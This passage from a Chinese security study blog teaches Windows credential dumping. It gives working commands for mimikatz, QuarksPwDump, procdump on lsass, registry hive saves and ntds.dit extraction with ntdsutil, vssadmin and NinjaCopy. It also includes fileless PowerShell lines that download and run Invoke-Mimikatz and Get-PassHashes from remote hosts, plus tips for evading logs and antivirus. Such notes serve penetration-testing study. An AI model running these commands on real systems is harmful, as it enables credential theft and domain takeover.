<li>GetPass</li>
<li>PwDump7</li>
<li>QuarkPwDump</li>
<li>Get-PassHashes</li>
<li>mimikatz</li>
</ul>
<h3 id="GetPass">GetPass</h3>
<p>GetPass 下载地址：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-163383.html">https://bbs.pediy.com/thread-163383.html</a></p>
<p>以管理员权限直接运行 GetPassword.exe 直接查看到明文密码</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112221105413.png" alt="image-20231112221105413"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112223103700.png" alt="image-20231112223103700"></p>
<p><code>windows7 32/64位</code>、<code>windows 8 x64</code>、<code>Windows Server 2008 R2 64位</code> 测试通过</p>
<h3 id="PwDump7">PwDump7</h3>
<p>PwDump7 下载地址：<a target="_blank" rel="noopener" href="https://www.tarasco.org/security/pwdump_7/">https://www.tarasco.org/security/pwdump_7/</a></p>
<p>在命令行环境中运行PwDump7程序，可以得到系统中所有账户的NTLM Hash</p>
<p>PwDump7 只能获取到用户的NTLM Hash，不能看到明文密码，不过可以使用这个 hash 值去 cmd5 等平台查找明文，或者通过彩虹表来破解哈希值，或者直接使用哈希传递。</p>
<p>PwDump7 同样使用管理员权限直接运行即可。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112224536814.png" alt="image-20231112224536814"></p>
<h3 id="QuarkPwDump">QuarkPwDump</h3>
<p>QuarkPwDump 下载地址：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe">https://raw.githubusercontent.com/tuthimi/quarkspwdump/master/Release/QuarksPwDump.exe</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/PegasusLab/QuarksPwDump-off-line">https://github.com/PegasusLab/QuarksPwDump-off-line</a></li>
</ul>
<p>运行以下命令导出用户 NTLM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">QuarkPwDump.exe --dump-hash-local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112230709443.png" alt="image-20231112230709443"></p>
<pre class="line-numbers language-none"><code class="language-none">#导出本地用户哈希值
QuarksPwDump-off-line.exe --dump-hash-local
QuarksPwDump-off-line.exe -dhl
#导出内存中的域控哈希值
QuarksPwDump-off-line.exe -dhdc
QuarksPwDump-off-line.exe --dump-hash-domain-cached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112231447682.png" alt="image-20231112231447682"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231112231510165.png" alt="image-20231112231510165"></p>
<p>QuarkPwDump 可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户、Bitlocker</p>
<p>QuarkPwDump 支持Windows XP/2003/Vista/7/8版本</p>
<p>QuarkPwDump 已经被大多数杀软标记为恶意软件</p>
<h3 id="Get-PassHashes">Get-PassHashes</h3>
<p>Get-PassHashes 是一个 PS 脚本</p>
<p>下载地址：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></li>
<li>nishang项目也包含此脚本<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113124924889.png" alt="image-20231113124924889"></li>
</ul>
<p>导入 ps1 脚本，以管理员权限执行 Get-PassHashes 即可。</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-PassHashes.ps1
Get-PassHashes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>或者绕过无法执行 PS 脚本的限制，直接无文件执行（推荐），同样需要管理员权限。</p>
<pre class="line-numbers language-none"><code class="language-none"># 不使用代理
powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;
#powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;C:\Users\Administrator\Desktop\Get-PassHashes\Get-PassHashes.ps1&#39;);Get-PassHashes&quot;

# 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问
powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113125804712.png" alt="image-20231113125804712"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113130217828.png" alt="image-20231113130217828"></p>
<h3 id="mimikatz">mimikatz</h3>
<p>mimikatz 是法国技术大神 Benjamin Delpy 使用 C 语言写的一款轻量级系统调试工具，该工具可以从内存中提取明文密码、散列值、PIN 和 K8S 票据，还可以执行哈希传递、票据传递、构建黄金票据等操作。</p>
<p>mimikatz 下载地址：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>使用 mimikatz 读取本地 SAM 文件，获取 NTLM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113175407435.png" alt="image-20231113175407435"></p>
<p>或者使用 mimikatz 直接查看明文密码</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113175501605.png" alt="image-20231113175501605"></p>
<p>另外也可以采用 PowerShell 远程加载 mimikatz，相较于直接拷贝 mimikatz.exe 到目标主机，这种方式隐藏性要更好些。</p>
<pre class="line-numbers language-none"><code class="language-none"># 不使用代理
powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;

# 使用代理，如果目标无法访问 github 可以使用下面的命令利用代理访问
powershell.exe -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113175606369.png" alt="image-20231113175606369"></p>
<h3 id="通过SAM和System文件抓取密码">通过SAM和System文件抓取密码</h3>
<h4 id="导出SAM和System文件">导出SAM和System文件</h4>
<pre class="line-numbers language-none"><code class="language-none">#通过reg的save选项将注册表中的SAM、System、SECURITY文件导出到本地磁盘
reg save HKLM\SAM sam.hiv
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113204427183.png" alt="image-20231113204427183"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113204753630.png" alt="image-20231113204753630"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231113174227990.png" alt="image-20231113174227990"></p>
<p>或者使用 ninjacopy 脚本，下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination &quot;c:\sam.hiv&quot;
Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;
Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SECURITY&quot; -LocalDestination &quot;c:\security.hiv&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果条件允许也可以使用 U 盘启动盘直接到SAM、System、SECURITY文件的对应目录下拷贝</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="读取SAM和System文件获取NTML-Hash">读取SAM和System文件获取NTML Hash</h4>
<h5 id="使用mimikatz读取SAM和System文件">使用mimikatz读取SAM和System文件</h5>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe
#文件和mimikatz放在同一目录
lsadump::sam &#x2F;sam:sam.hiv &#x2F;system:system.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114002210357.png" alt="image-20231114002210357"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114002335218.png" alt="image-20231114002335218"></p>
<h5 id="使用Cain读取SAM和System文件">使用Cain读取SAM和System文件</h5>
<p>下载地址：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/xchwarze/Cain">https://github.com/xchwarze/Cain</a></li>
<li><a target="_blank" rel="noopener" href="https://www.malavida.com/en/soft/cain-and-abel/">https://www.malavida.com/en/soft/cain-and-abel/</a></li>
</ul>
<p>打开Cain后可能会提示关闭防火墙，否则Cain一些功能会不能使用，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114124958082.png" alt="image-20231114124958082"></p>
<p>点击“确定”即可，使用Cain读取SAM和System文件不受影响</p>
<p>找到 Cracker 模块里的 “LM &amp; NTLM Hash”选项，点击加号，选择从 SAM 导入(“Import Hashes From a SAM database”)，选择 SAM 文件后，点击下一步即可查看</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114130125074.png" alt="image-20231114130125074"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114130150859.png" alt="image-20231114130150859"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114130205634.png" alt="image-20231114130205634"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114130239418.png" alt="image-20231114130239418"></p>
<p>cain 还可以直接查看明文密码，在 Decoders 里找到 LSA Secrets，导入 system.hiv 和 security.hiv 就可以看到明文的密码了。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114131447765.png" alt="image-20231114131447765"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114131511229.png" alt="image-20231114131511229"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114131541005.png" alt="image-20231114131541005"></p>
<h5 id="使用SAMInside读取SAM和System文件">使用SAMInside读取SAM和System文件</h5>
<p>SAMInside是一款俄罗斯人出品的Windows密码恢复软件，支持WindowsNT/2000/XP/2003/Vista的操作系统，由于程序是以汇编语言编写的，故解密速度很快</p>
<p>直接在 File 菜单中选择导入 SAM 和 SYSTEM 文件即可</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114124737134.png" alt="image-20231114124737134"></p>
<h3 id="通过lsass-dmp文件抓取密码">通过lsass.dmp文件抓取密码</h3>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114180821536.png" alt="image-20231114180821536"></p>
<h4 id="导出lsass-dmp文件">导出lsass.dmp文件</h4>
<p>方法一：任务管理器导出 lsass.dmp 文件</p>
<p>在任务管理器中找到 lsass.exe 右击选择创建转储文件即可。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114141014473.png" alt="image-20231114141014473"></p>
<p>方法二：使用 Procdump 导出 lsass.dmp 文件</p>
<p>Procdump 是微软官方发布的工具，因此基本不会被杀软拦截</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/Procdump.zip">https://download.sysinternals.com/files/Procdump.zip</a></p>
<pre class="line-numbers language-none"><code class="language-none">procdump -accepteula -ma lsass.exe lsass.DMP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114141415588.png" alt="image-20231114141415588"></p>
<h4 id="读取lsass-dmp文件">读取lsass.dmp文件</h4>
<h5 id="使用mimikatz读取lsass-dmp文件">使用mimikatz读取lsass.dmp文件</h5>
<pre class="line-numbers language-none"><code class="language-none">#将lssas.dmp文件复制到mimikatz.exe的同级目录
#运行mimikatz，将lsass.dmp文件加载到mimikatz
mimikatz.exe 
#看到Switch to MINIDUMP 加载成功
sekurlsa::minidump lsass.dmp    
#导出密码散列值
sekurlsa::logonPasswords full  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114142359114.png" alt="image-20231114142359114"></p>
<h3 id="通过ntds-dit文件抓取密码">通过ntds.dit文件抓取密码</h3>
<p>ntds.dit也被称为Active Directory database，在域中的所有账号密码被存放在了 ntds.dit 文件中，如果获取到该文件就相当于拿到整个域权限，不过<mark>该文件只在域控中，只有可以登录到域控的用户（如域管用户、DC本地管理员用户）可以访问</mark></p>
<p>ntds.dit 文件位置：</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Windows\NTDS\NTDS.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114181003877.png" alt="image-20231114181003877"></p>
<p>还有两点要注意：</p>
<ul>
<li>
<p><mark>ntds.dit是加密的，system文件中存放着ntds.dit的密钥，因此需要获取system文件来解密</mark></p>
</li>
<li>
<p>在正常的域环境中，ntds.dit 文件里包含大量的信息，<mark>体积较大</mark>。利用ntds.dit文件可以概述为两步，导出ntds.dit文件和读取ntds.dit文件。举个例子，如果域控制器上没有安装杀毒软件，就可以选择直接进入域控制器，导出 ntds.dit 并读取从而获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。所以==“导出”“读取”这两个步骤具体在哪台机器上完成是按具体情况而定的==</p>
</li>
</ul>
<h4 id="导出ntds-dit文件">导出ntds.dit文件</h4>
<h5 id="方法一：使用Ntdsutil">方法一：使用Ntdsutil</h5>
<p>Ntdsutil默认安装在域控制器上，可以在域控制器上直接操作</p>
<p>ntdsutil支持以下操作系统：</p>
<ul>
<li>Windows Server 2019</li>
<li>Windows Server 2016</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2008</li>
<li>Windows Server 2003 R2</li>
<li>Windows Server 2003</li>
</ul>
<p>使用Ntdsutil导出 ntds.dit 和 system 文件，并放在 C 盘目录下</p>
<pre class="line-numbers language-none"><code class="language-none">Ntdsutil &quot;activate instance ntds&quot; Ifm &quot;create full C:\ntdsutil&quot; Quit quit
#ntdsutil还支持使用简写，如下
#ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\ntdsutil&quot; q q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114220341327.png" alt="image-20231114220341327"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115110422179.png" alt="image-20231115110422179"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114170650814.png" alt="image-20231114170650814"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115105729765.png" alt="image-20231115105729765"></p>
<p>在目标路径下就会生成一个备份文件夹，如C:\test、C:\ntdsutil，下面以C:\test为例</p>
<p><mark>ntds.dit文件在C:\test\Active Directory\文件夹下</mark></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115111141732.png" alt="image-20231115111141732"></p>
<p><mark>SYSTEN 和 SECURITY文件在C:\test\registry\文件夹下</mark></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115111255835.png" alt="image-20231115111255835"></p>
<p>提取出文件后，记得删除创建的备份文件夹</p>
<pre class="line-numbers language-none"><code class="language-none">rmdir &#x2F;s&#x2F;q C:\test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><mark>上面是一种使用ntdsutil工具进行Active Directory数据库备份的方法，其实还可以使用创建快照的方法</mark>，就是麻烦些，如下</p>
<pre class="line-numbers language-none"><code class="language-none">#创建一个快照，该快照包含Windows中的所有文件，且在复制文件时不会受到Windows锁定机制的限制
ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115102906142.png" alt="image-20231115102906142"></p>
<p>可以看到，创建了一个 GUID 为 6a475b94-b066-448f-92b9-1a29b3fd2ef7 的快照。</p>
<p>接下来加载刚刚创建的快照。命令格式中的GUID就是刚刚创建快照的GUID</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit
ntdsutil snapshot &quot;mount &#123;6a475b94-b066-448f-92b9-1a29b3fd2ef7&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>快照将被加载到C:$SNAP_202011091624_VOLUMEC$\目录下：</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115103038723.png" alt="image-20231115103038723"></p>
<p>使用 Windows 自带的 copy 命令将快照中的文件复制出来，这里复制到C盘下，建议使用CMD而不是PowerShell</p>
<pre class="line-numbers language-none"><code class="language-none">copy C:\$SNAP_202011091624_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115103129793.png" alt="image-20231115103129793"></p>
<p>将之前加载的快照卸载并删除：</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit
ntdsutil snapshot &quot;unmount &#123;6a475b94-b066-448f-92b9-1a29b3fd2ef7&#125;&quot; &quot;delete &#123;6a475b94-b066-448f-92b9-1a29b3fd2ef7&#125;&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115103224836.png" alt="image-20231115103224836"></p>
<p>其中，6a475b94-b066-448f-92b9-1a29b3fd2ef7 为创建快照的 GUID，注意每次创建快照的 GUID 都不同</p>
<p>再次查询当前系统中的所有快照，显示没有任何快照，表示删除成功：</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutil snapshot &quot;List All&quot; quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115103320348.png" alt="image-20231115103320348"></p>
<h5 id="方法二：使用vssadmin">方法二：使用vssadmin</h5>
<p>vssadmin支持以下操作系统：</p>
<ul>
<li>Windows Server 2022</li>
<li>Windows Server 2019</li>
<li>Windows 10</li>
<li>Windows 8.1</li>
<li>Windows Server 2016</li>
<li>Windows Server 2012 R2</li>
<li>Windows Server 2012</li>
<li>Windows Server 2008 R2</li>
<li>Windows Server 2008</li>
</ul>
<p>使用vssadmin导出 ntds.dit</p>
<pre class="line-numbers language-none"><code class="language-none">#建议在CMD窗口运行，不要在PowerShell窗口运行
vssadmin create shadow &#x2F;for&#x3D;C:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit

# SAM 等文件也可以使用 vssadmin 导出
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\sam.hiv
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hiv
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\security.hiv

#列出计算机上的所有阴影副本
vssadmin list shadows
#列出仅与指定卷相关的阴影副本。如下，显示与C盘相关的所有阴影副本的详细信息
vssadmin list shadows &#x2F;for&#x3D;C:
#删除指定卷上的所有阴影副本。如果要删除多个卷的阴影副本，可以在命令中多次使用&quot;&#x2F;for&#x3D;&quot;选项
vssadmin delete shadows &#x2F;for&#x3D;C:
#vssadmin delete shadows &#x2F;for&#x3D;C: &#x2F;for&#x3D;D:
#删除指定的阴影副本(通过阴影副本的ID指定)
vssadmin delete shadows &#x2F;shadow&#x3D;&quot;阴影副本的ID&quot;
vssadmin delete shadows &#x2F;shadow&#x3D;&quot;&#123;41682a6a-a885-4152-a169-78ab7ce9c6c5&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114183635655.png" alt="image-20231114183635655"></p>
<p>如果使用PowerShell的话，可能会出现以下报错</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231114233357093.png" alt="image-20231114233357093"></p>
<p>PowerShell是无法直接访问\?\GlobalRoot开头的路径的。<mark>CMD其实也是不能直接访问的，但CMD中的copy指令貌似不受影响</mark>。</p>
<p>这里再补充一点，无法直接访问\?\GlobalRoot开头的路径的解决方法</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115132355648.png" alt="image-20231115132355648"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115132403615.png" alt="image-20231115132403615"></p>
<p>如上，CMD和PowerShell都是不能访问\?\GlobalRoot开头的路径的</p>
<p>可以通过创建符号链接(即软链接、快捷方式)解决</p>
<pre class="line-numbers language-none"><code class="language-none">#mklink指令只能在CMD中使用，因此下面的这个操作应该在CMD窗口中执行
mklink &#x2F;d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\
#创建完软链接后，\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\xxx就可以使用c:\testvsc\xxx访问

#使用完后记得删除符号链接
rd c:\testvsc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115132812906.png" alt="image-20231115132812906"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115132839573.png" alt="image-20231115132839573"></p>
<h5 id="方法三：使用NinjaCopy-脚本">方法三：使用NinjaCopy 脚本</h5>
<p>使用NinjaCopy 脚本导出 ntds.dit。另外，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\ntds.dit&quot;

#也可以导出SYSTEM等文件
Invoke-NinjaCopy -Path C:\Windows\System32\config\SYSTEM -LocalDestination C:\\system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="方法四：使用nishang中的Copy-VSS脚本">方法四：使用nishang中的Copy-VSS脚本</h5>
